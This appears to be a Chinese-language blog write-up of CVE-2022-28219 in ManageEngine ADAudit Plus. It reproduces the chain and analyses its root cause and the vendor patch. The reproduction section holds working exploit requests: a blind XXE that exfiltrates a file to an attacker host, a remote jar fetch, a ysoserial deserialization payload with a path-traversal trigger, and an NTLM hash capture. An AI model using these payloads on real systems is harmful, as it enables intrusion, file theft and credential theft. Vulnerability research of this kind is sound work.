title: CVE-2022-28219 ManageEngine ADAudit Plus XXE to RCE
author: bmth
tags:
  - CVE-2022-28219
top_img: 'https://img-blog.csdnimg.cn/46c595ddde3443a7adb3da43d795b808.png'
cover: 'https://img-blog.csdnimg.cn/46c595ddde3443a7adb3da43d795b808.png'
categories:
  - java
date: 2023-04-06 17:21:00
---
很有意思的一个洞，复现的同时学习一下java中xxe的攻击手法

漏洞公告：
[https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html](https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html)

影响版本：All ADAudit Plus builds below 7060

## 漏洞复现
在域控中下载存在漏洞的版本：[https://archives2.manageengine.com/active-directory-audit/7055/ManageEngine_ADAudit_Plus_x64.exe](https://archives2.manageengine.com/active-directory-audit/7055/ManageEngine_ADAudit_Plus_x64.exe)
默认安装即可，访问8081端口
![](https://img-blog.csdnimg.cn/46c595ddde3443a7adb3da43d795b808.png)

默认账号密码为admin/admin

### XXE
首先是一个无回显的XXE漏洞，如果单纯使用HTTP协议，是无法读取具有换行的文件的，那么就需要使用工具：[https://github.com/LandGrey/xxe-ftp-server](https://github.com/LandGrey/xxe-ftp-server)，即使用FTP协议来向外传递数据

并且在jdk老版本中的xxe可以通过`file://`和`netdoc://`协议读文件以及**列目录**，我们可以看到下载的jdk版本为`1.8.0_51`低版本
![](https://img-blog.csdnimg.cn/c4536549343e40ada2a05e27a793f4fa.png)

具体细节可参考：[9102年Java里的XXE](https://www.leadroyal.cn/p/914/)

exp：(需要知道域名)
```
POST /api/agent/tabs/agentData HTTP/1.1
Host: 192.168.111.138:8081
Accept-Encoding: gzip, deflate
Accept: */*
Connect: keep-alive
Content-Length: 369
Content-Type: application/json


[
    {
        "DomainName": "test.org",
        "EventCode": 4688,
        "EventType": 0,
        "TimeGenerated": 0,
        "Task Content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [  <!ENTITY % file SYSTEM \"file:///c:/windows/win.ini\">  <!ENTITY % dtd SYSTEM \"http://192.168.111.1:3000/data.dtd\"> %dtd;]><data>&send;</data>"
    }
]
```
![](https://img-blog.csdnimg.cn/f80f309d2a8446ffa83f4c18a02c7542.png)

成功获取到`c:/windows/win.ini`文件内容

java中的xxe还支持`jar://`协议，格式为`jar:{url}!{path}`，能从远程获取 jar 文件
jar 协议处理文件的过程：
1. 下载 jar/zip 文件到临时文件中
2. 提取出我们指定的文件
3. 删除临时文件

我们可以使用[https://github.com/pwntester/BlockingServer](https://github.com/pwntester/BlockingServer)，BlockingServer 提供文件并保持连接打开，因此临时文件不会被删除
```json
[
    {
        "DomainName": "test.org",
        "EventCode": 4688,
        "EventType": 0,
        "TimeGenerated": 0,
        "Task Content":"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [  <!ENTITY xxe SYSTEM \"jar:http://192.168.111.1:9090/calc.jar!/test.txt\">  ]><root>&xxe;</root>"
    }
]
```
![](https://img-blog.csdnimg.cn/5f6c1462d83141a389ed437dd9c43273.png)

然后列目录得到临时文件名，一般windows下的临时文件是在`C:\Users\用户名\AppData\Local\Temp`，linux下的临时文件是在`/tmp`
![](https://img-blog.csdnimg.cn/0f9d277c32df40cabc85003d6c2ddc02.png)

看到临时文件已经被写入进来了，jar协议生成的临时文件为`jar_cachexxxxxx.tmp`

该漏洞需要知道域名，我们可以POST访问`/api/agent/configuration/getAgentServerInfo`接口
![](https://img-blog.csdnimg.cn/eb96aa276bc24539b22c70cc1cb7fb64.png)

如果配置了agent之后会有完整的ServerFQDN，默认配置下得到完整域名

### 反序列化rce
使用ysoserial生成反序列化payload，因为ADAudit引用了Commons-beanutils库，所以可以生成CB载荷
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc.exe > calc.jar
```
触发rce
```
http://192.168.111.138:8081/cewolf/a.png?img=/../../../../../../../../../Users/bmth/AppData/Local/Temp/jar_cache4707608721027995217.tmp
```
![](https://img-blog.csdnimg.cn/17a5f4f3f3434e41aacde6e438568806.png)

成功执行命令弹出计算器，回显的话使用tomcat回显即可
![](https://img-blog.csdnimg.cn/9bce7f9c852744b09d9f23510ea5730a.png)

网上已经公开了利用脚本：[https://github.com/horizon3ai/CVE-2022-28219](https://github.com/horizon3ai/CVE-2022-28219)

### NTLM Relay
Java在使用内置类 `sun.net.www.protocol.http.HttpURLConnection` 发送HTTP请求遇到状态码为401的HTTP返回头时，会判断该页面要求使用哪种认证方式，若采用的NTLM认证则会自动使用当前用户凭据进行认证
其根本原因在于Windows下的Java默认启用了透明NTLM认证，并且将所有由外部传入的URL地址都认为是可信的

运行著名的相应工具：[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
`python3 Responder.py -I eth0 -rv`
![](https://img-blog.csdnimg.cn/74ef50c5deda41cf92b8873a7dcd510a.png)

发送一个请求来触发 XXE 并让 ADAudit Plus 服务器连接回攻击 IP，成功捕获到用户的 NTLMv2 哈希

参考：
[Ghidra 从 XXE 到 RCE](https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/)
[这是一篇“不一样”的真实渗透测试案例分析文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#4-xxe-to-%E5%9F%9F%E6%8E%A7)

## 漏洞分析
修改`ADAudit Plus\bin\run.bat`中的JAVA_OPTS变量如下，添加JVM动态调试
```
set JAVA_OPTS=-Xmx512m -Dcatalina.home="%SERVER_HOME%" -Dserver.home="%SERVER_HOME%" -Dlog.dir="%SERVER_HOME%" -Ddb.home="%DB_HOME%" -Djava.library.path="%SERVER_HOME%\lib\native" -Dserver.stats=10000  -Dfile.encoding="utf8" -Djava.util.logging.manager="org.apache.juli.ClassLoaderLogManager" -Djava.util.logging.config.file="%SERVER_HOME%/conf/logging.properties" -Dserver.stats=10000 -Dcheck.tomcatport="true" -Dhaltjvm.on.dbcrash="true" -Duser.home="%SERVER_HOME%\logs" -Dorg.apache.catalina.authenticator.Constants.SSO_SESSION_COOKIE_NAME=JSESSIONIDADAPSSO   -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
```
然后将源码copy到idea中，启动动态调试

### 反序列化
这个反序列化其实是CVE-2020-10189

首先看到`webapps/adap/WEB-INF/web.xml`，找到`CewolfServlet`这个Servlet，注意到`init-param`将参数storage设置为`de.laures.cewolf.storage.FileStorage`
![](https://img-blog.csdnimg.cn/a016fb4510ed4a909c0d3889c4b96f63.png)

路径为`/cewolf/*`，也就是漏洞触发点
![](https://img-blog.csdnimg.cn/a97c13134743408196611fdf0ddfb96a.png)

Servlet实现类为`de.laures.cewolf.CewolfRenderer`，在doGet方法中接收了一个img参数，并调用`FileStorage#getChartImage`方法
![](https://img-blog.csdnimg.cn/cf73212dde014f578f50889ed1ee032c.png)

跟进可以看到直接readObject反序列化
![](https://img-blog.csdnimg.cn/d51f9b1f2e834935b91c2d622d69b12b.png)

路径是直接拼接的，那么我们可以使用`../`跨目录来反序列化任意文件
![](https://img-blog.csdnimg.cn/f6dd9c0faad74495ba9fdaf85c35e264.png)

注意，servlet 请求路径需要以指定的文件扩展名结尾
```java
if (reqURI == null || !reqURI.endsWith(".png") && !reqURI.endsWith(".jpg") && !reqURI.endsWith(".css") && !reqURI.endsWith(".js") && !reqURI.endsWith(".gif") && !reqURI.endsWith(".jpeg") && !reqURI.endsWith(".bmp") && !reqURI.endsWith(".html") && !reqURI.endsWith(".eot")) {
```

可以使用
```
.png
.jpg
.css
.js
.gif
.html
.eot
```
绕过安全过滤器


### XXE
同样先看web.xml
![](https://img-blog.csdnimg.cn/36ab33c09fb3429ea5a885d5ba4f4d49.png)

从`com.adventnet.sym.adsm.auditing.webclient.ember.api.ADAPAgentAPIServlet`这个类开始跟进，发现并没有进行身份验证
![](https://img-blog.csdnimg.cn/fd2485db08654dc78963f59d72625596.png)

看到get和post请求都会调用processRequest，随后走到`com.adventnet.sym.adsm.auditing.webclient.ember.api.RestAPIHandler#executeAgentRequest`方法
![](https://img-blog.csdnimg.cn/ee9a596ba25a487dad8e3e745b7b6826.png)

根据urlPath匹配对应的mappingInfo，然后使用`Method.invoke`反射调用，可以看到调用了`com.adventnet.sym.adsm.auditing.webclient.ember.api.agent.AgentDataHandler#receiveData`，跟进
![](https://img-blog.csdnimg.cn/566b093aa05f406ca836b872868b4fb9.png)

从body中取json并转换为数组
![](https://img-blog.csdnimg.cn/d08c6d95a43042c687d03ec954e28cf9.png)

最后调用`com.adventnet.sym.adsm.auditing.server.EventDataAdapter#notify`向eventQueue中加入事件
![](https://img-blog.csdnimg.cn/12eadf4729c349f8bdc3fbc22d26290e.png)

接着看到处理消息队列的地方，在`com.adventnet.sym.adsm.auditing.server.EventDataAdapter.EventDispatcher#run`中
![](https://img-blog.csdnimg.cn/52356ad6b97243c9a033b964f253d953.png)

调用`com.adventnet.sym.adsm.auditing.server.ProcessMonitor#process`
![](https://img-blog.csdnimg.cn/1c95fdc1e44e44c0a6e8da94f77215e5.png)

process函数会获取DomainName对应的键值来迭代，最终调用addEventRows
![](https://img-blog.csdnimg.cn/d3e029e448ba4a29ba6cb0f0181c4de7.png)

它会根据传入的CategoryId参数来获取不同的Listener，然后分发进入getEventRowList函数，这里id为11的时候刚好是ProcessTrackingListener

跟进`com.adventnet.sym.adsm.auditing.server.category.ProcessTrackingListener#getEventRow`
![](https://img-blog.csdnimg.cn/7e8b40575ff746a19971990765843a06.png)

跟进parseTaskContent方法，最终通过DocumentBuilderFactory类触发盲XXE漏洞
![](https://img-blog.csdnimg.cn/5c9de26aeeb8491e9550c41a243423e8.png)

## 漏洞修复

The patch in ADAudit Plus 7060 fixes the vulnerability by:
- Removing the /cewolf endpoint altogether
- Using a secure version of DocumentBuilderFactory in the ProcessTrackingListener class
- Requiring authentication in the form of an agent GUID between agents and ADAudit Plus


注释掉了CewolfServlet
![](https://img-blog.csdnimg.cn/a0747d21903f47fe8b5beff18466c39a.png)

在`AdventnetADAPServer.jar!\com\adventnet\sym\adsm\auditing\server\category\ProcessTrackingListener.class`代码中修复掉了XXE漏洞：
![](https://img-blog.csdnimg.cn/25ec7b311f0e4293b7866d2acf575d3b.png)

在`AdventNetADAPClient.jar!\com\adventnet\sym\adsm\auditing\webclient\ember\api\agent\AgentDataHandler.class`加了Guid校验
![](https://img-blog.csdnimg.cn/c825f0bb95414abebe527fe4d81fcec4.png)

参考：
[Zoho ManageEngine ADAudit Plus (CVE-2022-28219)漏洞分析](https://www.cnblogs.com/nice0e3/p/16742215.html)
[CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE到RCE](https://xz.aliyun.com/t/11506)
[CVE-2022-28219 Zoho组合Java XXE和反序列化漏洞实现RCE](http://www.yang99.top/index.php/archives/83/)
[CVE-2022-28219 Zoho ManageEngine ADAudit Plus XXE到RCE漏洞复现](https://forum.butian.net/share/2004)
